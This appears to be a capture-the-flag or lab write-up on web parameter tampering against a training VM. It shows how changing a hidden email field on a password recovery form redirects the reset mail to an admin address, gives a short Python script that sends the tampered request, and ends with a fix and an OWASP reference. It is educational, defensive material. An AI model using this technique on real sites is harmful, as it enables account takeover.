# Web Parameter Tampering

### Introduction
Web parameter tampering refers to the act of manipulating parameters exchanged between the client and server to alter application data. In our context, this involves modifying the values of hidden fields within input forms.

### Procedure
By inspecting the recovery page, we observed a hidden field in the form request containing the email information. By altering the input value from the email address of the webmaster `webmaster@borntosec.com` to the email address of the admin `admin@borntosec.com`, we can redirect the password recovery email to the admin instead of the webmaster.

### Program
To automate this process, we developed a Python program that sends a password recovery request using the admin's email, `admin@borntosec.com`. This request is initiated by calling the `try_recover` function.
```python
def try_recover(mail: str):
	encoded_params = urllib.parse.urlencode({ 'page': 'recover' })

	url = 'http://192.168.56.2/?{}'.format(encoded_params)

	data = { 'mail': mail, 'Submit': 'Submit' }
	headers = { 'Content-Type': "application/x-www-form-urlencoded" }

	response = requests.post(url, data=data, headers=headers)

	return response.text
```

### How to fix
It is crucial for the service to prevent the disclosure of private information. In our case, the recovery email is considered private as it is the destination for the recovery email, and therefore, it should only be stored server-side to avoid being modified by the client.

### Sources
[OWASP - Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)